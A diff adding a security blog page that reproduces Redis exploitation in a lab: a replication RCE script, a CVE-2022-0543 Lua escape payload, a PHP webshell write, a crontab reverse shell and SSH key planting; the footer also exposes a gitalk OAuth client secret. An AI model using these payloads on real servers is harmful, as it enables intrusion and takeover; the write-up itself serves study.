@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.0.0/css/all.min.css" integrity="sha256-jTIdiMuX/e3DGJUGwl3pKSxuc6YOuqtJYkM0bGQESA4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.10.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}}},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="搭java环境老是出问题 烦了 来复现一下 redis 面试和渗透测试经常会出现 没有系统去总结过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis相关知识">
+<meta property="og:url" content="http://example.com/2022/08/09/redis-learn/index.html">
+<meta property="og:site_name" content="b1ue0cean&#39;s   blog">
+<meta property="og:description" content="搭java环境老是出问题 烦了 来复现一下 redis 面试和渗透测试经常会出现 没有系统去总结过">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/08/09/redis-learn/image-20220809200946448.png">
+<meta property="og:image" content="http://example.com/2022/08/09/redis-learn/image-20220809202527264.png">
+<meta property="og:image" content="http://example.com/2022/08/09/redis-learn/image-20220809203322886.png">
+<meta property="og:image" content="http://example.com/2022/08/09/redis-learn/1646189491_621edbb3defa387369497.jpeg">
+<meta property="article:published_time" content="2022-08-09T11:48:26.000Z">
+<meta property="article:modified_time" content="2022-08-09T12:47:11.157Z">
+<meta property="article:author" content="b1ue0cean">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/08/09/redis-learn/image-20220809200946448.png">
+
+
+<link rel="canonical" href="http://example.com/2022/08/09/redis-learn/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/08/09/redis-learn/","path":"2022/08/09/redis-learn/","title":"redis相关知识"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>redis相关知识 | b1ue0cean's   blog</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="b1ue0cean's   blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">b1ue0cean's   blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">welcome to my world -- sharing CTF & ML skills</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section">About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section">Tags<span class="badge">92</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section">Categories<span class="badge">73</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section">Archives<span class="badge">128</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis-4-x-5-x-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.1.</span> <span class="nav-text">Redis 4.x&#x2F;5.x 主从复制导致的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%B6%E6%84%8F%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD"><span class="nav-number">1.1.1.</span> <span class="nav-text">恶意模块加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="nav-number">1.1.2.</span> <span class="nav-text">主从复制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Redis-Lua%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88CVE-2022-0543%EF%BC%89"><span class="nav-number">1.2.</span> <span class="nav-text">Redis Lua沙盒绕过命令执行（CVE-2022-0543）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99webshell"><span class="nav-number">1.3.</span> <span class="nav-text">写webshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.4.</span> <span class="nav-text">crontab反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99ssh-key"><span class="nav-number">1.5.</span> <span class="nav-text">写ssh-key</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">2.</span> <span class="nav-text">reference</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="b1ue0cean"
+      src="/uploads/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">b1ue0cean</p>
+  <div class="site-description" itemprop="description">我就是我，人间不一样的烟火</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/godrun666" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;godrun666" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1019076587@qq.com" title="E-Mail → mailto:1019076587@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/b1ue0cean7" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;b1ue0cean7" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_53755216" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_53755216" rel="noopener" target="_blank">CSDN</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/09/redis-learn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpeg">
+      <meta itemprop="name" content="b1ue0cean">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="b1ue0cean's   blog">
+      <meta itemprop="description" content="我就是我，人间不一样的烟火">
+    </span>
+    
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="redis相关知识 | b1ue0cean's   blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          redis相关知识
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-08-09 19:48:26 / Modified: 20:47:11" itemprop="dateCreated datePublished" datetime="2022-08-09T19:48:26+08:00">2022-08-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>搭java环境老是出问题 烦了 来复现一下 redis 面试和渗透测试经常会出现 没有系统去总结过</p>
+<span id="more"></span>
+
+<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="Redis-4-x-5-x-主从复制导致的命令执行"><a href="#Redis-4-x-5-x-主从复制导致的命令执行" class="headerlink" title="Redis 4.x/5.x 主从复制导致的命令执行"></a>Redis 4.x/5.x 主从复制导致的命令执行</h3><p>端口开在 6379</p>
+<p><img src="/2022/08/09/redis-learn/image-20220809200946448.png" alt="image-20220809200946448"></p>
+<p>直接连接 存在未授权访问</p>
+<p>直接拿脚本打</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python3</span> redis-master.py -r <span class="number">192.168.0.101</span> -p <span class="number">6379</span> -L <span class="number">192.168.33.133</span> -P <span class="number">9999</span> -f RedisModulesSDK/exp.so -c <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/redis-learn/image-20220809202527264.png" alt="image-20220809202527264"></p>
+<p>分析一下原理</p>
+<h4 id="恶意模块加载"><a href="#恶意模块加载" class="headerlink" title="恶意模块加载"></a>恶意模块加载</h4><blockquote>
+<p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。 Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp <span class="regexp">/home/u</span>buntu<span class="regexp">/Desktop/</span>Temp<span class="regexp">/redis-rce/</span>exp.so Docker_ID:<span class="regexp">/data/</span>exp.so</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/09/redis-learn/image-20220809203322886.png" alt="image-20220809203322886"></p>
+<h4 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h4><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>
+<p>Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</p>
+<p>说白了 就是利用这个东西把so文件写进去</p>
+<h3 id="Redis-Lua沙盒绕过命令执行（CVE-2022-0543）"><a href="#Redis-Lua沙盒绕过命令执行（CVE-2022-0543）" class="headerlink" title="Redis Lua沙盒绕过命令执行（CVE-2022-0543）"></a>Redis Lua沙盒绕过命令执行（CVE-2022-0543）</h3><p>我们借助Lua沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>。在Lua中执行这个导出函数，即可获得<code>io</code>库，再使用其执行命令：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，不同环境下的liblua库路径不同，你需要指定一个正确的路径。在我们Vulhub环境（Ubuntu fiocal）中，这个路径是<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>。</p>
+<p>连接redis，使用<code>eval</code>命令执行上述脚本：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>可见命令已成功执行：</p>
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>利用 redis 备份文件向 web 根目录写 webshell，使用条件：</p>
+<ul>
+<li>已知网站根目录</li>
+<li>有文件读写权限</li>
+</ul>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root kali)-<span class="string">[~]</span></span><br><span class="line">└─# redis-cli -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">103</span> -p <span class="number">6379</span></span><br><span class="line"><span class="number">192.168.0.103:6379</span>&gt; config set dir /var/www/html</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.0.103:6379</span>&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.0.103:6379</span>&gt; set shell <span class="string">&quot;&lt;?php eval($_GET[1]);?&gt;&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.0.103:6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="crontab反弹shell"><a href="#crontab反弹shell" class="headerlink" title="crontab反弹shell"></a>crontab反弹shell</h3><p>写定时任务的两个文件：</p>
+<ol>
+<li><code>/var/spool/cron/</code>目录下存放的是每个用户包括 root 的 crontab 任务，Ubuntu 系统在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，Centos 系统则在<code>/var/spool/cron/&lt;username&gt;</code></li>
+<li><code>/etc/crontab</code>这个文件负责调度各种管理和维护任务，Centos 和 Ubuntu 系统均存在这个文件，需要 root 权限</li>
+</ol>
+<ul>
+<li>bash 反弹 shell</li>
+</ul>
+<p>这种方法在 ubuntu 不能够使用，原因有两个</p>
+<ol>
+<li>如果写<code>/etc/crontab</code>文件，会夹杂脏数据导致命令语法报错</li>
+<li>如果写<code>/var/spool/cron/crontabs/&lt;username&gt;</code>文件因为 redis 写 644 的权限，但 ubuntu 要求执行定时任务文件权限必须是 600，否则报错<code>INSECURE MODE (mode 0600 expected) (crontabs/root)</code>，并且写这个文件也会语法报错</li>
+</ol>
+<p>但是在 centos 上则不会，所以在 centos 上可以使用这种方法</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="keyword">set</span> dir <span class="operator">/</span><span class="keyword">var</span><span class="operator">/</span>spool<span class="operator">/</span>cron</span><br><span class="line">config <span class="keyword">set</span> dbfilename root</span><br><span class="line"><span class="keyword">set</span> shell <span class="string">&quot;<span class="subst">\n</span><span class="subst">\n</span>*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<span class="subst">\n</span><span class="subst">\n</span>&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<h3 id="写ssh-key"><a href="#写ssh-key" class="headerlink" title="写ssh-key"></a>写ssh-key</h3><p>使用条件比较苛刻：</p>
+<ul>
+<li>redis 是以 root 权限启动</li>
+<li>允许密钥登陆</li>
+</ul>
+<p>一般 ssh 公钥存放目录为<code>/root/.ssh</code>，目的就是将自己的公钥写入目标服务器的<code>/root/.ssh</code>文件夹的<code>authotrized_keys</code>文件中，进而可以直接使用对应的私钥登录目标服务器，复现步骤如下</p>
+<ol>
+<li>在本地生成公私钥<code>ssh-keygen -t rsa</code></li>
+</ol>
+<p><img src="/2022/08/09/redis-learn/1646189491_621edbb3defa387369497.jpeg" alt="1646189491_621edbb3defa387369497.png!small?1646189490788"></p>
+<ol>
+<li>将公钥写入临时文件中</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; /tmp/rsa.txt   </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>同样的使用 config 写入文件</li>
+</ol>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/rsa.txt | redis-cli -h<span class="built_in"> ip </span>-p 6379 -x <span class="built_in">set</span> rsa</span><br><span class="line">redis-cli -h<span class="built_in"> ip </span>-p 6379<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">set</span> dir /root/.ssh/<span class="built_in"></span></span><br><span class="line"><span class="built_in">config </span><span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>ssh登录</li>
+</ol>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -<span class="selector-tag">i</span> id_rsa root<span class="keyword">@ip</span></span><br></pre></td></tr></table></figure>
+
+<p>网上有利用脚本：<a target="_blank" rel="noopener" href="https://github.com/JoyChou93/hackredis">https://github.com/JoyChou93/hackredis</a></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://www.runoob.com/redis/redis-commands.html">Redis 命令 | 菜鸟教程 (runoob.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/281161.html">渗透测试 | Redis渗透 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/323640.html">Redis安全问题 - FreeBuf网络安全行业门户</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>b1ue0cean
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="http://example.com/2022/08/09/redis-learn/" title="redis相关知识">http://example.com/2022/08/09/redis-learn/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="https://twitter.com/b1ue0cean7">
+          <span class="icon">
+            <i class="fab fa-twitter"></i>
+          </span>
+
+          <span class="label">Twitter</span>
+        </a>
+      </div>
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class=""></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/redis/" rel="tag"># redis</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/08/09/Spring4Shell/" rel="prev" title="Spring4Shell">
+                  <i class="fa fa-chevron-left"></i> Spring4Shell
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/08/09/phar-bugHunte/" rel="next" title="phar反序列化再学习与真实环境漏洞挖掘">
+                  phar反序列化再学习与真实环境漏洞挖掘 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"godrun666","repo":"godrun666.github.io","client_id":"7f8a0f5a5c88a0fea952","client_secret":"57250fa3a3b4cb1d0e0dad43bb1fffe7355d61a8","admin_user":"godrun666","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"a91f4e095b4c9593e00da162f6278c7a"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
